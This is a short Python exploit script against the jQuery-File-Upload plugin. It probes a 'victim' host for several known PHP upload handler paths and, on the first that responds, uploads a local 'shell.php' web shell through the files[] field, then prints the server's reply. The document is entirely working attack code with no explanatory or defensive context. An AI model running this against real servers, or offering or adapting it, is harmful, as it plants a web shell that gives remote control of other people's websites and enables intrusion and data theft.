import requests
import json
import sys

PATHS = [
    "/server/php/",
    "/jQuery-File-Upload/server/php/upload.class.php",
    "/jQuery-File-Upload/example/upload.php",
    "/jQuery-File-Upload/server/php/UploadHandler.php",
    "/jQuery-File-Upload/php/index.php"]


def expl(headers, victim):
    url_target = 'http://' + victim
    for x in PATHS:
        url = url_target + x
        resp_head = requests.head(url, headers=headers)
        if resp_head.status_code == 200:
            with open('shell.php', 'rb') as f:
                r = requests.post(url, files={'files[]': f}, headers=headers)
                json_data = json.loads(r.text)
                return(json_data)


def main(argv):
    headers = {"User-Agent": "Pikachu", "Accept": "*/*"}
    victim = argv[1]
    print expl(headers, victim)


if __name__ == "__main__":
    main(sys.argv)
